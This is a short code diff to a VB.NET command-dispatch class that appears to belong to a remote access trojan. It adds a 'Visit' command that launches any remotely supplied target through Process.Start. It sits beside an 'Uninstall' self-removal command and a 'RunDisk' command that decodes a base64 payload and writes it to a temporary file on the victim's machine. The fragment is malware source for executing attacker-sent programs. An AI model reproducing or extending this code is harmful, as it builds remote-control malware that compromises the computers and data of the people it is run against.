@@ -34,6 +34,9 @@ Public Class C_Commands
                 Case "Uninstall"
                     C_Installation.DEL()
 
+                Case "Visit"
+                    Process.Start(A(1))
+
                 Case "RunDisk"
                     Dim NewFile = Path.GetTempFileName & IO.Path.GetExtension(A(1))
                     File.WriteAllBytes(NewFile, Convert.FromBase64String(A(2)))
